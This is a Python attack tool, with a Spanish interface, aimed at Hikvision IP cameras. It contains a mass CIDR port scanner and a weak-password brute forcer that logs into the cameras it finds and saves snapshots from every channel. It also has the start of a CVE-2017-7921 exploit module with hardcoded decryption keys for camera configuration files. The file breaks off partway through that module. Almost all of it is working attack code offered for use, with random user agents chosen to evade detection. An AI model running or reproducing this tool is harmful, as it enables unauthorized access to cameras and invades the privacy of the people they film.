import os
import sys
import asyncio
import ipaddress
import time
import argparse
import requests
from requests.auth import HTTPDigestAuth
from collections import namedtuple
from xml.etree import ElementTree
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional
import random
from colorama import init, Fore, Style
import urllib3
from lxml import etree
from Crypto.Cipher import AES
from itertools import cycle
import re
from loguru import logger
from passlib.hash import md5_crypt
from threading import Lock

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colors
init(autoreset=True)

# ------------------- Shared Utilities -------------------
def get_user_agent(name='random') -> str:
    """Randomly select a User-Agent."""
    user_agents = {
        'Chrome': ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
    'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36',
    'Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1',
    'Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6',
    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
    'Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/1EA69',
    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
    'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/19.0.1047.0 Safari/535.22',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1041.0 Safari/535.21',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
    'Mozilla/5.0 (Macintosh; AMD Mac OS X 10_8_2) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/18.6.872',
    'Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19',
    'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/11.10 Chromium/18.0.1025.142 Chrome/18.0.1025.142 Safari/535.19',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.56 Chrome/17.0.963.56 Safari/535.11',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz',
    'Mozilla/5.0 (X11; CrOS i686 1193.158.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
    'Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2',
    'Opera/9.51 (X11; Linux i686; U; Linux Mint; en)',
    'Opera/9.50 (X11; Linux x86_64; U; pl)',
    'Opera 9.4 (Windows NT 6.1; U; en)',
    'Opera/9.30 (Nintendo Wii; U; ; 2071; Wii Shop Channel/1.0; en)',
    'Opera/9.27 (X11; Linux i686; U; fr)',
    'Opera/9.26 (Windows; U; pl)',
    'Opera/9.25 (X11; Linux i686; U; fr-ca)',
    'Opera/9.24 (X11; SunOS i86pc; U; en)',
    'Opera/9.23 (X11; Linux x86_64; U; en)',
    'Opera/9.22 (X11; OpenBSD i386; U; en)',
    'Opera/9.21 (X11; Linux x86_64; U; en)',
    'Opera/9.20(Windows NT 5.1; U; en)',
    'Opera/9.12 (X11; Linux i686; U; en) (Ubuntu)',
    'Opera/9.10 (X11; Linux; U; en)',
    'Opera/9.02 (X11; Linux i686; U; pl)',
    'Opera/9.01 (X11; OpenBSD i386; U; en)',
    'Opera/9.00 (X11; Linux i686; U; pl)',
    'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Opera 8.60 [en]',
    'Opera/8.54 (X11; Linux i686; U; pl)',
    'Opera/8.53 (Windows NT 5.2; U; en)',
    'Opera/8.52 (X11; Linux x86_64; U; en)',
    'Opera/8.51 (X11; U; Linux i686; en-US; rv:1.8)',
    'Opera/8.50 (Windows NT 5.1; U; ru)',
    'Opera/8.10 (Windows NT 5.1; U; en)',
    'Opera/8.02 (Windows NT 5.1; U; ru)',
    'Opera/8.01 (Windows NT 5.1; U; pl)',
    'Opera/8.00 (Windows NT 5.1; U; en)',
    'Mozilla/5.0 (X11; Linux i386; U) Opera 7.60  [en-GB]',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54u1  [en]',
    'Opera/7.54 (X11; Linux i686; U)  [en]',
    'Opera/7.53 (X11; Linux i686; U) [en_US]',
    'Opera/7.52 (Windows NT 5.1; U) [en]',
    'Opera/7.51 (X11; SunOS sun4u; U) [de]',
    'Opera/7.50 (Windows XP; U)',
    'Opera/7.23 (Windows NT 6.0; U)  [zh-cn]',
    'Opera/7.22 (Windows NT 5.1; U)  [de]',
    'Opera/7.21 (Windows NT 5.1; U)  [en]',
    'Opera/7.20 (Windows NT 5.1; U)  [en]',
    'Opera/7.11 (Windows NT 5.1; U)  [pl]',
    'Opera/7.10 (Windows NT 5.1; U)  [en]',
    'Opera/7.03 (Windows NT 5.1; U)  [en]',
    'Opera/7.02 (Windows NT 5.1; U)  [fr]',
    'Opera/7.01 (Windows NT 5.1; U)  [en]',
    'Opera/7.0 (Windows NT 5.1; U)  [en]',
    'Opera/6.12 (Linux 2.4.20-4GB i686; U)  [en]',
    'Opera/6.11 (Linux 2.4.18-bf2.4 i686; U)  [en]',
    'Mozilla/5.0 (Linux 2.4.18-ltsp-1 i686; U) Opera 6.1  [en]',
    'Mozilla/5.0 (Windows XP; U) Opera 6.06  [en]',
    'Opera/6.05 (Windows XP; U) [en]',
    'Opera/6.04 (Windows XP; U)  [en]',
    'Opera/6.03 (Windows NT 4.0; U)  [en]',
    'Opera/6.02 (Windows NT 4.0; U)  [de]',
    'Opera/6.01 (X11; U; nn)',
    'Opera/6.0 (Windows XP; U)  [de]',
    'Opera/5.12 (Windows NT 5.1; U)  [de]',
    'Opera/5.11 (Windows 98; U)  [en]',
    'Opera/5.02 (Windows 98; U)  [en]',
    'Opera/5.0 (Ubuntu; U; Windows NT 6.1; es; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13',
    'Opera/4.02 (Windows 98; U) [en]',
    'Mozilla/5.0 (Macintosh; ; Intel Mac OS X; fr; rv:1.8.1.1) Gecko/20061204 Opera'],
    'Firefox': ['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6; rv:141.0) Gecko/20100101 Firefox/141.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.'],
    'Edge': ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.3405.102',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.3405.102',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.1958'],
    'Safari': ['Mozilla/5.0 (Macintosh; Intel Mac OS X 15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1'
        ]
    }
    if name in user_agents:
        return random.choice(user_agents[name])
    return random.choice(random.choice(list(user_agents.values())))

def load_file(file_path: str) -> List[str]:
    """Load a file and return a list of non-empty lines."""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.error(f"File {file_path} not found")
        return []
    except UnicodeDecodeError:
        logger.error(f"Failed to decode {file_path}. Ensure it is UTF-8 encoded.")
        return []

# ------------------- Scanner Module -------------------
async def tcp_check(ip, port=80, timeout=2.5, retries=1):
    """Check if a TCP port is open with retries."""
    for attempt in range(retries):
        try:
            fut = asyncio.open_connection(ip, port)
            reader, writer = await asyncio.wait_for(fut, timeout=timeout)
            writer.close()
            await writer.wait_closed()
            return True
        except:
            if attempt == retries - 1:
                return False
            await asyncio.sleep(0.5)

async def scan_hosts(cidr: str, port: int = 80, concurrency: int = 1500, timeout: float = 1.5):
    """Scan a CIDR range and save live hosts to host.txt."""
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(ip) for ip in net.hosts()]
    except ValueError:
        print(f"{Fore.RED}❌ Error: CIDR inválido{Style.RESET_ALL}")
        return []

    print(f"{Fore.CYAN}🔍 Escaneando {len(hosts)} hosts en el puerto {port}...{Style.RESET_ALL}")
    live_hosts = []
    sem = asyncio.Semaphore(concurrency)
    start_time = time.time()

    async def check_host(ip, idx):
        async with sem:
            if await tcp_check(ip, port, timeout):
                live_hosts.append(ip)
                print(f"{Fore.GREEN}✅ Host activo: {ip}{Style.RESET_ALL}")
            if (idx + 1) % 10 == 0 or idx + 1 == len(hosts):
                done = round(((idx + 1) / len(hosts)) * 100, 2)
                elapsed = time.time() - start_time
                print(f"{Fore.CYAN}Progreso: {done}% | Tiempo transcurrido: {elapsed:.1f}s{Style.RESET_ALL}", end="\r")

    await asyncio.gather(*[check_host(ip, i) for i, ip in enumerate(hosts)])

    with open("host.txt", "w", encoding="utf-8") as f:
        for ip in live_hosts:
            f.write(ip + "\n")

    print(f"\n{Fore.GREEN}🎯 Escaneo finalizado. Hosts vivos: {len(live_hosts)}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📄 Resultados guardados en: host.txt{Style.RESET_ALL}")
    return live_hosts

def run_scanner():
    """Run the CIDR scanner."""
    print(f"{Fore.MAGENTA}=== Escáner de Rango CIDR ==={Style.RESET_ALL}")
    
    # MODIFICADO: Solicitar CIDR interactivamente en el menú
    cidr = input(f"{Fore.YELLOW}Ingresa el rango CIDR (ej: 192.168.1.0/24): {Style.RESET_ALL}").strip()
    if not cidr:
        print(f"{Fore.RED}❌ Error: Debes ingresar un rango CIDR válido.{Style.RESET_ALL}")
        return
    
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description="CIDR Scanner")
        parser.add_argument("cidr", help="CIDR range (e.g., 192.168.1.0/24)")
        parser.add_argument("--port", type=int, default=80, help="Port to scan")
        parser.add_argument("--concurrency", type=int, default=1000, help="Concurrent connections")
        parser.add_argument("--timeout", type=float, default=1.5, help="Connection timeout")
        args = parser.parse_args(sys.argv[2:])
        asyncio.run(scan_hosts(args.cidr, args.port, args.concurrency, args.timeout))
    else:
        asyncio.run(scan_hosts(cidr, port=80, concurrency=1000, timeout=1.5))

# ------------------- Brute Force Module -------------------
class POCTemplate:
    level = namedtuple('level', 'high medium low')('高', '中', '低')
    poc_classes = []

    @staticmethod
    def register_poc(cls):
        POCTemplate.poc_classes.append(cls)

    def __init__(self, config):
        self.config = config
        self.name = self.get_file_name(__file__)
        self.product = 'base'
        self.level = self.level.low

    def get_file_name(self, file):
        return os.path.basename(file).split('.')[0]

    def get_headers(self) -> dict:
        return {'Connection': 'close', 'User-Agent': get_user_agent()}

    def verify(self, ip, port):
        pass

    def _snapshot(self, url, img_file_name, auth=None) -> int:
        img_path = os.path.join(self.config.out_dir, self.config.snapshots, img_file_name)
        try:
            os.makedirs(os.path.dirname(img_path), exist_ok=True)
            res = requests.get(url, auth=auth, timeout=self.config.timeout, verify=False, headers=self.get_headers(), stream=True)
            res.raise_for_status()
            if 'image' not in res.headers.get('Content-Type', '').lower():
                return 0
            with open(img_path, 'wb') as f:
                for chunk in res.iter_content(10240):
                    f.write(chunk)
            return 1
        except Exception:
            return 0

    def exploit(self, results: tuple) -> int:
        return 0

class HikvisionWeakPassword(POCTemplate):
    def __init__(self, config):
        super().__init__(config)
        self.product = config.product.get('hikvision', 'hikvision')
        self.level = POCTemplate.level.medium

    def verify(self, ip, port=80):
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    r = requests.get(
                        f"http://{ip}:{port}/ISAPI/Security/userCheck",
                        auth=(user, password), timeout=self.config.timeout,
                        headers=self.get_headers(), verify=False
                    )
                    if r.status_code == 200 and '200' in r.text:
                        return ip, str(port), self.product, user, password, self.__class__.__name__
                    time.sleep(0.1)  # Delay to avoid rate-limiting
                except Exception:
                    continue
        return None

    def exploit(self, results):
        ip, port, product, user, password, _ = results
        channels = 1
        try:
            res = requests.get(
                f"http://{ip}:{port}/ISAPI/Image/channels",
                auth=HTTPDigestAuth(user, password), headers=self.get_headers(),
                timeout=self.config.timeout, verify=False
            )
            res.raise_for_status()
            channels = len(ElementTree.fromstring(res.text))
        except Exception:
            pass

        snapshots = 0
        for channel in range(1, channels+1):
            img_file_name = f"{ip}-{port}-channel{channel}-{user}-{password}.jpg"
            url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{channel}01/picture"
            snapshots += self._snapshot(url, img_file_name, auth=HTTPDigestAuth(user, password))
        return snapshots

POCTemplate.register_poc(HikvisionWeakPassword)

class CoreBruteForce:
    def __init__(self, config, selected_pocs=None):
        self.config = config
        self.selected_pocs = selected_pocs or POCTemplate.poc_classes
        self.vulnerable_count = 0
        self.snapshot_count = 0

    def scan_ip(self, ip):
        for port in self.config.ports:
            for poc_class in self.selected_pocs:
                poc = poc_class(self.config)
                try:
                    result = poc.verify(ip, port)
                    if result:
                        snaps = poc.exploit(result)
                        self.vulnerable_count += 1
                        self.snapshot_count += snaps
                        print(f"\n{Fore.RED}[!] Cámara vulnerable: {Fore.CYAN}{ip}:{port}{Style.RESET_ALL}")
                        print(f"    {Fore.YELLOW}Vulnerabilidad: {Style.RESET_ALL}{result[5]}")
                        print(f"    {Fore.YELLOW}Credenciales: {Style.RESET_ALL}{result[3]}:{result[4]}")
                        print(f"    {Fore.YELLOW}Snapshots guardados: {Style.RESET_ALL}{snaps}")
                        with open(os.path.join(self.config.out_dir, self.config.vulnerable), 'a') as f:
                            f.write(f"{','.join(map(str, result))},{snaps}\n")
                    else:
                        with open(os.path.join(self.config.out_dir, self.config.not_vulnerable), 'a') as f:
                            f.write(f"{ip},{port},{poc.name}\n")
                except:
                    continue

    def run(self):
        os.makedirs(self.config.out_dir, exist_ok=True)
        os.makedirs(os.path.join(self.config.out_dir, self.config.snapshots), exist_ok=True)
        ip_list = load_file(self.config.ip_file)
        if not ip_list:
            print(f"{Fore.RED}No hay IPs en {self.config.ip_file}{Style.RESET_ALL}")
            return

        total_ips = len(ip_list)
        print(f"{Fore.GREEN}Total IPs a escanear: {total_ips}{Style.RESET_ALL}")

        with ThreadPoolExecutor(max_workers=500) as executor:
            futures = [executor.submit(self.scan_ip, ip) for ip in ip_list]
            completed = 0
            for future in as_completed(futures):
                future.result()
                completed += 1
                print(f"{Fore.CYAN}Progreso: {completed}/{total_ips} IPs comprobadas{Style.RESET_ALL}", end='\r')

        print("\n" + "="*40)
        print(f"{Fore.GREEN}Escaneo terminado{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Cámaras vulnerables encontradas: {Style.RESET_ALL}{self.vulnerable_count}")
        print(f"{Fore.YELLOW}Snapshots totales guardados: {Style.RESET_ALL}{self.snapshot_count}")
        print("="*40)

def run_brute_force():
    """Run the Hikvision weak password scanner."""
    print(f"{Fore.MAGENTA}=== Escáner de Contraseñas Débiles Hikvision ==={Style.RESET_ALL}")
    config = {
        'users': load_file('user.txt') or ['admin'],
        'passwords': load_file('pass.txt') or ['admin', 'admin12345', '12345'],
        'ports': [80],
        'product': {'hikvision': 'Hikvision'},
        'timeout': 10,
        'out_dir': 'output',
        'ip_file': 'host.txt',
        'user_agent': get_user_agent(),
        'snapshots': 'snapshots',
        'vulnerable': 'results.csv',
        'not_vulnerable': 'not_vulnerable.csv',
    }
    Config = namedtuple('Config', config.keys())
    config = Config(**config)
    CoreBruteForce(config, [HikvisionWeakPassword]).run()

# ------------------- CVE-2017-7921 Module -------------------
class CVE_2017_7921(POCTemplate):
    def __init__(self, config):
        super().__init__(config)
        self.product = config.product.get('hikvision', 'hikvision')
        self.level = POCTemplate.level.high

    def _config_decryptor(self, data):
        def add_to_16(s):
            while len(s) % 16 != 0:
                s += b'\0'
            return s

        def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
            return bytes(a ^ b for a, b in zip(data, cycle(key)))

        def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
            key = bytes.fromhex(hex_key)
            ciphertext = add_to_16(ciphertext)
            cipher = AES.new(key, AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext[16:])
            return plaintext.rstrip(b"\0")

        def strings(file):
